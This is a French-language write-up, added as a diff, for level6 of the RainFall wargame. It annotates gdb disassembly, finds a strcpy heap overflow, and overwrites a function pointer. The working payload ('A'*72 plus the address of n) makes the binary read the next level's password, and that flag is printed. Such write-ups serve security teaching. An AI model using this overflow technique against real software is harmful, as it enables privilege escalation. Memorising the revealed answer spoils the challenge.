@@ -1,0 +1,103 @@
+-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6*
+
+level6@RainFall:~$ ./level6 
+Segmentation fault (core dumped)
+
+level6@RainFall:~$ ./level6 sad
+Nope
+
+segfault s'il n'y a pas d'arg
+
+(gdb) info functions 
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+
+(gdb) disas main
+0x0804847c <+0>:     push   %ebp
+0x0804847d <+1>:     mov    %esp,%ebp
+0x0804847f <+3>:     and    $0xfffffff0,%esp
+0x08048482 <+6>:     sub    $0x20,%esp				-> StackFrame 32
+0x08048485 <+9>:     movl   $0x40,(%esp)			-> 64 à esp |=> arg de malloc
+0x0804848c <+16>:    call   0x8048350 <malloc@plt>	-> malloc(64)
+0x08048491 <+21>:    mov    %eax,0x1c(%esp)			-> recup le ptr de malloc à esp+28 |=> ptr1
+0x08048495 <+25>:    movl   $0x4,(%esp)				-> 4 à esp |=> arg de malloc
+0x0804849c <+32>:    call   0x8048350 <malloc@plt>	-> malloc(4)
+0x080484a1 <+37>:    mov    %eax,0x18(%esp)			-> recup le ptr de malloc à esp+24 |=> ptr2
+
+0x080484a5 <+41>:    mov    $0x8048468,%edx			-> addr de <m> dans edx ?	|=> initialistion du ptr sur fonction avec le ptr de <m>
+0x080484aa <+46>:    mov    0x18(%esp),%eax			-> ptr2 dans eax			|=> initialistion du ptr sur fonction avec le ptr de <m>
+0x080484ae <+50>:    mov    %edx,(%eax)				-> addr de <m> est save dans la memoire de eax |=> addr dans 2nd ptr => Pointeur sur fonction <m>
+
+0x080484b0 <+52>:    mov    0xc(%ebp),%eax			-> ebp+12 -> argv					|=> arg de strcpy
+0x080484b3 <+55>:    add    $0x4,%eax				-> ebp+4 -> argv[1]					|=> arg de strcpy
+0x080484b6 <+58>:    mov    (%eax),%eax				-> déréférence, recup la string		|=> arg de strcpy
+0x080484b8 <+60>:    mov    %eax,%edx				-> Place l'input dans edx
+0x080484ba <+62>:    mov    0x1c(%esp),%eax			-> ptr1 dans eax		|=> arg de strcpy
+0x080484be <+66>:    mov    %edx,0x4(%esp)			-> Place l'input à esp+4
+0x080484c2 <+70>:    mov    %eax,(%esp)				-> ptr1 est au top 		|=> arg de strcpy
+0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>	-> strcpy(ptr1, *argv)
+
+0x080484ca <+78>:    mov    0x18(%esp),%eax			-> Recup le ptr2 dans eax	|=> Prepartion de l'appel du ptr sur fonction
+0x080484ce <+82>:    mov    (%eax),%eax				-> Lit la valeur en mémoire	|=> Prepartion de l'appel du ptr sur fonction
+0x080484d0 <+84>:    call   *%eax					-> Appel du ptr sur fonction
+0x080484d2 <+86>:    leave  
+0x080484d3 <+87>:    ret 
+
+(gdb) disas n
+0x08048454 <+0>:     push   %ebp
+0x08048455 <+1>:     mov    %esp,%ebp
+0x08048457 <+3>:     sub    $0x18,%esp				-> StackFrame de 24
+0x0804845a <+6>:     movl   $0x80485b0,(%esp)		-> "/bin/cat /home/user/level7/.pass"
+0x08048461 <+13>:    call   0x8048370 <system@plt>	-> execve("/bin/cat /home/user/level7/.pass")
+0x08048466 <+18>:    leave  
+0x08048467 <+19>:    ret  
+
+(gdb) disas m										-> Appeller quand l'arg n'est pas le bon
+0x08048468 <+0>:     push   %ebp
+0x08048469 <+1>:     mov    %esp,%ebp
+0x0804846b <+3>:     sub    $0x18,%esp				-> StackFrame de 24
+0x0804846e <+6>:     movl   $0x80485d1,(%esp)		-> "Nope"
+0x08048475 <+13>:    call   0x8048360 <puts@plt>
+0x0804847a <+18>:    leave  
+0x0804847b <+19>:    ret 
+
+L'objectif ici est de faire en sorte que ce ne soit pas l'addr de <m> qui soit save dans le ptr sur fonction
+mais plutot celle de n
+
+=> Il semblerait que strcpy ai une faille
+
+« La fonction strcpy() est connue pour provoquer diverses vulnérabilités de corruption de mémoire puisqu'elle n'effectue aucun contrôle des limites
+et est donc considérée comme non sûre. 
+Comme il n'y a pas de contrôle de limites sur l'argument identity fourni par l'utilisateur avant d'invoquer strcpy(), nous étions sûrs de pouvoir déclencher un dépassement de tampon basé sur le tas, 
+déclenchant ainsi une vulnérabilité de corruption de mémoire »
+
+le ptr1 est limité à 64, cependant l'input ne l'est pas
+
+Possibilité:
+-> Provoquer une overflow via l'input vers l'addr du ptr sur fonction pour y injecter l'addr de <n> 
+
+90 -> trop
+80 -> OK
+80 + 4 => ptr2
+
+0x08048454 -> \x54\x84\x04\x08
+
+python -c 'print "A"*80+"\x54\x84\x04\x08"' > /tmp/here
+
+l'offset de 80 ne fonctionne pas -> l'overflow se passe sur la HEAP non pas sur la STACK
+ebp et eip ne se trouve pas à la suite même si l'offset calculé correspond a 80
+
+=> A cause de malloc -> metadonnée et alignement de ptr1
+ptr1 = 64 + 4(meta) => 68 => alignement => 72
+
+0 -> 72	| 72 -> 76	| Unknown
+  ptr1	|   ptr2	| Unknown
+
+L'écriture au dela de 72 sera dans ptr2
+
+python -c 'print "A"*72+"\x54\x84\x04\x08"' > /tmp/here
+
+level6@RainFall:~$ python -c 'print "A"*72+"\x54\x84\x04\x08"' > /tmp/here
+level6@RainFall:~$ cat /tmp/here | xargs ./level6 
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
